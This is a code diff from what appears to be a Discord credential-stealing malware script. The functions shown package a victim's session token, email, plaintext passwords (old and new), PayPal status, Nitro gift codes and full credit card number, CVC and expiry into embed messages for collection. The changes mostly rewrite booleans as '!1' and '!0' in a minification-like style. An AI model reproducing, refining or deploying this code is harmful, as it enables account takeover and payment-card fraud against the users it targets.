@@ -662,32 +662,32 @@ const login = async (email, password, token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Email**',
             value: `**${email}** `,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Password**',
             value: `**${password}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
           
         ],
@@ -720,37 +720,32 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            name: '**Old Password**',
-            value: `**${oldpassword}**`,
-            inline: false,
-          },
-          {
-            name: 'New Password',
-            value: `**${newpassword}**`,
-            inline: true,
+            inline: !1,
           },
           {
             name: '**Email**',
             value: `**${json.email}**`,
-            inline: false,
+            inline: !1,
+          },
+          {
+            name: 'New Password',
+            value: `**${newpassword}**`,
+            inline: !0,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
           
         ],
@@ -780,32 +775,32 @@ const emailChanged = async (email, password, token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Email Changed**',
             value: `**${email}**`,
-            inline: true,
+            inline: !1,
           },
           {
-            name: '**Password Changed**',
+            name: '**Password**',
             value: `**${password}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
     
         ],
@@ -835,27 +830,27 @@ const globalnamechanged = async (global_name, token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Global Name Changed**',
             value: `**${json.global_name}**\n`,
-            inline: true,
+            inline: !1,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
           
         ],
@@ -885,27 +880,27 @@ const usernamechanged = async (global_name, token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Username Changed**',
             value: `**${json.username}**\n`,
-            inline: true,
+            inline: !1,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
           
         ],
@@ -935,27 +930,27 @@ const PaypalAdded = async (token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Paypal Added**',
             value: `:white_check_mark:`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
         ],
         author: {
@@ -984,27 +979,27 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Credit Card Added**',
             value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
         ],
         author: {
@@ -1038,27 +1033,27 @@ const nitroBought = async (token) => {
           {
             name: '**Token**',
             value: `\`${token}\``,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Nitro bought!**',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
+            inline: !1,
           },
           {
             name: '**Nitro**',
             value: `**${nitro}**`,
-            inline: false,
+            inline: !1,
           },
           {
             name: '**Badges**',
             value: `**${badges}**`,
-            inline: true,
+            inline: !0,
           },
           {
             name: '**Billing**',
             value: `**${billing}**`,
-            inline: true,
+            inline: !0,
           },
         ],
         author: {
